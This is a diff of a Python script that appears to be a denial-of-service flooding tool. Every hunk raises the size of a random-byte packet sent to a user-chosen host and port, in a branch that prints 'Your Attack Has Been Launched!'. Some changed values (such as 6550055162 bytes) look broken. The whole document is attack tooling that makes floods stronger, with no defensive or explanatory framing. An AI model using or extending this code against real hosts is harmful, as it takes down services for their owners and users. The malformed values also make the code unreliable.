@@ -387,7 +387,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -403,7 +403,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -419,7 +419,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -435,7 +435,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -451,7 +451,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -467,7 +467,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 70055162
+					pack = 6550055162
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -483,7 +483,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -499,7 +499,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -515,7 +515,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -531,7 +531,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -547,7 +547,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -563,7 +563,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -579,7 +579,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -595,7 +595,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -611,7 +611,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 70055162
+					pack = 6550055162
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -628,7 +628,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -644,7 +644,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -660,7 +660,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -676,7 +676,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -692,7 +692,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -708,7 +708,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 70055162
+					pack = 6550055162
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -724,7 +724,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -740,7 +740,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -756,7 +756,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -772,7 +772,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -788,7 +788,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -804,7 +804,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -820,7 +820,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -836,7 +836,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -852,7 +852,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 70055162
+					pack = 6550055162
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -868,7 +868,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -884,7 +884,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -900,7 +900,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -916,7 +916,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -932,7 +932,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -948,7 +948,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 70055162
+					pack = 6550055162
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -964,7 +964,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -980,7 +980,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -996,7 +996,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -1012,7 +1012,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -1028,7 +1028,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -1044,7 +1044,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -1060,7 +1060,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -1076,7 +1076,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -1092,7 +1092,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -1108,7 +1108,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 70055162
+					pack = 6550055162
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -1124,7 +1124,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -1140,7 +1140,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -1156,7 +1156,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -1172,7 +1172,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -1188,7 +1188,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -1204,7 +1204,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -1220,7 +1220,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -1236,7 +1236,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -1252,7 +1252,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 70055162
+					pack = 6550055162
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -1269,7 +1269,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -1285,7 +1285,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -1301,7 +1301,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -1317,7 +1317,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -1333,7 +1333,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -1349,7 +1349,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 70055162
+					pack = 6550055162
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -1365,7 +1365,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -1381,7 +1381,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -1397,7 +1397,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -1413,7 +1413,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -1429,7 +1429,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -1445,7 +1445,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -1461,7 +1461,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -1477,7 +1477,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -1493,7 +1493,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 70055162
+					pack = 6550055162
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -1509,7 +1509,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -1525,7 +1525,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -1541,7 +1541,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -1557,7 +1557,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -1573,7 +1573,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -1589,7 +1589,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 70055162
+					pack = 6550055162
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -1605,7 +1605,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -1621,7 +1621,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -1637,7 +1637,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -1653,7 +1653,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -1669,7 +1669,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -1685,7 +1685,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -1701,7 +1701,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -1717,7 +1717,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -1733,7 +1733,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -1749,7 +1749,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 70055162
+					pack = 6550055162
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -1765,7 +1765,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -1781,7 +1781,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -1797,7 +1797,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -1813,7 +1813,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -1829,7 +1829,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -1845,7 +1845,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -1861,7 +1861,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -1877,7 +1877,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -1893,7 +1893,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 70055162
+					pack = 6550055162
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -1910,7 +1910,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -1926,7 +1926,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -1942,7 +1942,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
